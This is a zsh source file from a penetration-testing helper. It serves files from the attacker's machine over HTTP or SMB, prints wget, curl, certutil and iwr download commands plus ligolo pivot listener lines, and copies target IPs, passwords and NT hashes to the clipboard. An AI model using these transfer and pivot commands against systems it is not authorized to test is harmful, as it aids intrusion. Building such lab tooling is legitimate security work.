# tools: things you do by hand on every box, with your own IP filled in. They never touch
# the target on their own: you run the commands they print.
#
#   dz serve [dir] [port]       HTTP server + download commands for every file
#   dz serve smb [dir] [port]   SMB share (impacket) + copy commands
#   dz serve --via <host|ip>    for hosts behind a pivot: the ligolo listener to add, and
#                               download commands with the pivot's IP
#   dz -cp [what]               copy the target IP, a host, your IP, a cred, ... to the clipboard

# Your IP on the VPN interface, in $REPLY, or fail with a message.
_dz_my_ip() {
  _dz_attacker_refresh
  REPLY=$ATTACKER_IP
  [[ -n $REPLY ]] || { _dz_err E601 "$DZ_IFACE is down, no IP to use (connect your VPN, or set iface in the config)"; return 1 }
}

# IP of the pivot for dz serve --via: an IP, or a host of the loaded box (dz -t), in $REPLY.
_dz_via_ip() {
  local l
  if _dz_valid_ip $1; then REPLY=$1; return 0; fi
  [[ -n $BOX ]] && _dz_box_read $DZ_ROOT/$BOX 2>/dev/null || return 1
  [[ $1 == $BOX ]] && { REPLY=$reply[2]; return 0 }
  for l in $_dz_bh; do [[ ${l%% *} == $1 ]] && { REPLY=${${l#* }%% *}; return 0 }; done
  return 1
}

# dz serve [smb] [dir] [port] [--via <host|ip>]
_dz_serve() {
  emulate -L zsh
  local smb=0 dir='' port='' via='' a f ip url
  [[ $1 == smb ]] && { smb=1; shift }
  while (( $# )); do
    a=$1
    if [[ $a == --via ]]; then
      [[ -n $2 ]] || { _dz_err E602 "--via needs the pivot: a host of the box (dz -t) or its IP"; return 1 }
      _dz_via_ip $2 || { _dz_err E603 "no host '$2' in ${BOX:-the box}, give its IP or add it with dz -t"; return 1 }
      via=$REPLY; shift
    elif [[ $a == <1-65535> ]]; then port=$a
    else dir=$a
    fi
    shift
  done
  # Windows only talks SMB on 445, and the pivot already uses that port itself.
  (( smb )) && [[ -n $via ]] && { _dz_err E604 "SMB doesn't work through a pivot listener, use HTTP: dz serve --via ..."; return 1 }
  dir=${dir:-$PWD}
  # 'dz serve exploits' = the exploits folder of the loaded box.
  [[ ! -d $dir && -n $BOX && -d $DZ_ROOT/$BOX/$dir ]] && dir=$DZ_ROOT/$BOX/$dir
  [[ -d $dir ]] || { _dz_err E605 "no folder $dir"; return 1 }
  dir=${dir:A}
  # Never share a folder with box files (creds, .dropzone, notes) or your whole home.
  if [[ $dir == ${HOME:A} || -e $dir/.dropzone || -e $dir/creds || -e $dir/notes.md ]]; then
    _dz_err E606 "${dir/#$HOME/~} holds your box files, serve a subfolder (dz serve exploits)"
    return 1
  fi
  _dz_my_ip || return 1; ip=$REPLY
  local -a files=($dir/*(N.:t))
  _dz_ui

  if (( smb )); then
    (( $+commands[impacket-smbserver] )) || { _dz_err E607 "impacket-smbserver not found (apt install python3-impacket)"; return 1 }
    port=${port:-445}
    _dz_rule; _dz_head "SMB share" "\\\\$ip\\share → ${dir/#$HOME/~}"
    _dz_row "copy" "copy \\\\$ip\\share\\<file> ." 8
    _dz_row "run" "\\\\$ip\\share\\<file>" 8
    _dz_row "upload" "copy <file> \\\\$ip\\share\\" 8
    (( port != 445 )) && _dz_row "note" "Windows only talks SMB on 445; other ports need a tunnel" 8
    for f in $files[1,8]; do _dz_row "" "copy \\\\$ip\\share\\$f ." 8; done
    _dz_rule
    impacket-smbserver -smb2support -ip $ip -port $port share $dir
    return
  fi

  # Through a pivot the target downloads from the pivot's IP; a ligolo listener there
  # forwards the port to this server. A pivot can't listen below 1024 without root.
  if [[ -n $via ]]; then
    port=${port:-8000}
    url=http://$via:$port
  else
    port=${port:-80}
    url=http://$ip${${port:#80}:+:$port}
  fi
  _dz_rule; _dz_head "HTTP server" "$url → ${dir/#$HOME/~}"
  if [[ -n $via ]]; then
    _dz_row "ligolo" "listener_add --addr 0.0.0.0:$port --to $ip:$port --tcp" 8
    _dz_row "" "${_ud}in the ligolo-ng proxy, on the session of the pivot ($via)${_ur}" 8
    (( port < 1024 )) && _dz_row "note" "the pivot needs root to listen on port $port" 8
  fi
  if (( ! $#files )); then
    _dz_row "" "(the folder is empty)" 8
  fi
  for f in $files[1,12]; do
    print -r -- "    ${_uk}$f${_ur}"
    _dz_row "linux" "wget $url/$f -O /tmp/$f    curl -so /tmp/$f $url/$f" 8
    _dz_row "windows" "iwr $url/$f -OutFile \$env:TEMP\\$f    certutil -urlcache -f $url/$f $f" 8
  done
  (( $#files > 12 )) && _dz_row "" "... and $(( $#files - 12 )) more" 8
  _dz_rule
  print -r -- "${_ud}Listens on $ip only. Ctrl-C stops the server${_ur}"
  python3 -m http.server $port --bind $ip --directory $dir
}

# dz -cp [what]: the value of what, in $REPLY, and a label for the message in reply.
#   (empty)   the target        <host>   that host's IP (dz -t)      me      your IP
#   domain    $DOMAIN           targets  every IP of the box
#   user      $TARGET_USER      pass     $PASSWORD        hash   $NT_HASH
_dz_cp_value() {
  local what=$1 l
  local -a w
  reply=()
  case $what in
    ''|target) REPLY=$TARGET_IP; reply=("the target IP${DZ_ACTIVE:+ ($DZ_ACTIVE)}") ;;
    me|attacker) _dz_attacker_refresh; REPLY=$ATTACKER_IP; reply=("your IP ($DZ_IFACE)") ;;
    domain) REPLY=${DOMAIN-}; reply=("the domain") ;;
    targets) REPLY=${TARGETS-}; reply=("all target IPs") ;;
    user) REPLY=${TARGET_USER-}; reply=("the user") ;;
    pass|password) REPLY=${PASSWORD-}; reply=("the password of ${TARGET_USER-?}" secret) ;;
    hash) REPLY=${NT_HASH-}; reply=("the NT hash of ${TARGET_USER-?}" secret) ;;
    *)
      _dz_box_read $DZ_ROOT/$BOX 2>/dev/null || return 1
      if [[ $what == $BOX ]]; then REPLY=$reply[2]; reply=("the IP of $BOX"); return 0; fi
      for l in $_dz_bh; do
        w=(${=l})
        [[ $w[1] == $what ]] && { REPLY=$w[2]; reply=("the IP of $what"); return 0 }
      done
      return 1 ;;
  esac
  [[ -n $REPLY ]]
}

_dz_copy() {
  emulate -L zsh
  [[ -n $BOX ]] || { _dz_err E201 "no box loaded"; return 1 }
  _dz_cp_value "$1" || {
    _dz_err E608 "nothing to copy for '${1:-target}' (target, <host>, me, domain, targets, user, pass, hash)"
    return 1 }
  local value=$REPLY what=$reply[1] secret=$reply[2] tool=''
  if [[ -n $WAYLAND_DISPLAY ]] && (( $+commands[wl-copy] )); then tool=wl-copy
  elif [[ -n $DISPLAY ]] && (( $+commands[xclip] )); then tool=xclip
  elif [[ -n $DISPLAY ]] && (( $+commands[xsel] )); then tool=xsel
  fi
  if [[ -z $tool ]]; then
    print -r -- $value                     # no clipboard: print it, so $(dz -cp dc01) works
    return 0
  fi
  case $tool in
    wl-copy) print -rn -- $value | wl-copy ;;
    xclip)   print -rn -- $value | xclip -selection clipboard >/dev/null 2>&1 ;;
    xsel)    print -rn -- $value | xsel -b -i ;;
  esac
  if [[ -n $secret ]]; then print "• copied $what"
  else print "• copied $what: $value"
  fi
}
